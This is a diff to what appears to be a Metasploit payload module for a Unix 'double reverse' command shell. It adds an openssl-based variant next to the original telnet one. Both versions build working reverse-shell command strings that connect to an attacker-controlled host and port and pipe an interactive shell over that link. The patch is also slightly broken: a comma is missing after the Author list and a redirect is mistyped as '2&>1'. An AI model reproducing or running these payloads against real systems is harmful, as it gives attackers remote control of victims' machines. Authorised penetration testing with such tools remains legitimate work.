@@ -21,10 +21,13 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Double reverse TCP (telnet)',
+			'Name'          => 'Unix Command Shell, Double reverse TCP (telnet) or Double reverse SSL (openssl)',
 			'Version'       => '$Revision$',
 			'Description'   => 'Creates an interactive shell through two inbound connections',
-			'Author'        => 'hdm',
+			'Author'        => [
+						'hdm', # original module
+						'RageLtMan' # SSL patch
+					]
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
@@ -38,12 +41,18 @@ module Metasploit3
 					'Payload' => ''
 				}
 			))
+		# XXX: Not supported by all modules
+		register_advanced_options(
+			[
+				OptBool.new('SSL', [true, 'Use SSL for the listener socket', false]),
+			], Msf::Handler::ReverseTcp)
 	end
 
 	#
 	# Constructs the payload
 	#
 	def generate
+		vprint_good(command_string)
 		return super + command_string
 	end
 
@@ -51,12 +60,18 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		cmd =
-			"sh -c '(sleep #{3600+rand(1024)}|" +
-			"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
-			"while : ; do sh && break; done 2>&1|" +
-			"telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
-			" >/dev/null 2>&1 &)'"
+		if datastore['SSL']
+			cmd = "openssl s_client -connect #{datastore['LHOST']}:#{datastore['LPORT']}|" +
+				"/bin/bash 2&>1|openssl s_client -connect #{datastore['LHOST']}:#{datastore['LPORT']}"
+		else
+			cmd =
+				"sh -c '(sleep #{3600+rand(1024)}|" +
+				"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
+				"while : ; do sh && break; done 2>&1|" +
+				"telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
+				" >/dev/null 2>&1 &)'"
+		end
+
 		return cmd
 	end
 
